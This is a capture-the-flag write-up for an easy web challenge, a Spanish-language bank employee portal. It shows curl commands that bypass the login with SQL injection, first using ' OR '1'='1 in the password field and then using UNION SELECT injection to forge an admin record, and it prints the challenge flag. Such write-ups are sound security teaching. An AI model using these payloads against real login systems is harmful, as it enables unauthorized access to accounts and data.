# 5. Banco Capybara: Acceso Interno

**Category**: Web  
**Difficulty**: EASY  
**Points**: 100  

## Description

> El Banco Capybara estrenó su portal privado para empleados, pero lo lanzaron con prisa. Consigue entrar como administrador sin conocer su contraseña. La bandera aparece cuando el sistema te reconoce con rol de administrador.
>
> URL: http://192.99.247.166:8081
>
> **Flag format:** `EVIL{...}`

## Reconnaissance

Initial probe of the login portal:

```bash
$ curl -s http://192.99.247.166:8081/
# Returns a login form with fields "usuario" and "password"
```

Testing default credentials and basic SQL injection:

```bash
$ curl -s -X POST http://192.99.247.166:8081/ -d "usuario=admin&password=admin"
# "Credenciales incorrectas. Acceso denegado."

$ curl -s -X POST http://192.99.247.166:8081/ -d "usuario=' OR '1'='1&password=anything"
# "Credenciales incorrectas. Acceso denegado."

$ curl -s -X POST http://192.99.247.166:8081/ -d "usuario=admin&password=' OR '1'='1"
# Success! Logged in as "capybarito" (regular user)
```

The password field is vulnerable to SQL injection. The query likely looks like:
```sql
SELECT * FROM users WHERE usuario = 'input' AND password = 'input'
```

Injecting `' OR '1'='1` in the password field bypasses authentication but logs in as the first user in the database (capybarito).

## Analysis

To achieve admin access, I needed to control which user record is returned. Using UNION injection in the username field to craft a custom record with admin role:

```bash
# Determine column count via UNION SELECT
$ curl -s -X POST http://192.99.247.166:8081/ -d "usuario=' UNION SELECT 'a','b','c'--&password=x"
# Error: "SELECTs to the left and right of UNION do not have the same number of result columns"

$ curl -s -X POST http://192.99.247.166:8081/ -d "usuario=' UNION SELECT 'a','b','c','d'--&password=x"
# Success! "Acceso ADMIN concedido. Nivel de privilegio: MÁXIMO."
```

The users table has 4 columns. The payload `usuario=' UNION SELECT 'admin','admin','admin','admin'--` creates a synthetic admin record that the application accepts as valid.

## Exploitation

```bash
$ curl -s -X POST http://192.99.247.166:8081/ \
  -d "usuario=' UNION SELECT 'admin','admin','admin','admin'--&password=x"
```

Response contains:
```html
<div class="evs-alert ok">Acceso ADMIN concedido. Nivel de privilegio: MÁXIMO.</div>
<div class="evs-flag">EVIL{bl1nd_0r_n0t_sql1_byp4ss}</div>
```

## Flag

```
EVIL{bl1nd_0r_n0t_sql1_byp4ss}
```

## Key Takeaways

- SQL injection in login forms often allows authentication bypass via `' OR '1'='1`
- When that logs in as the wrong user, UNION injection can forge a specific user record
- Column count determination via incremental UNION SELECT is reliable
- The flag was rendered directly in the HTML response after successful admin login

## References

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- UNION-based SQLi technique: https://portswigger.net/web-security/sql-injection/union-attacks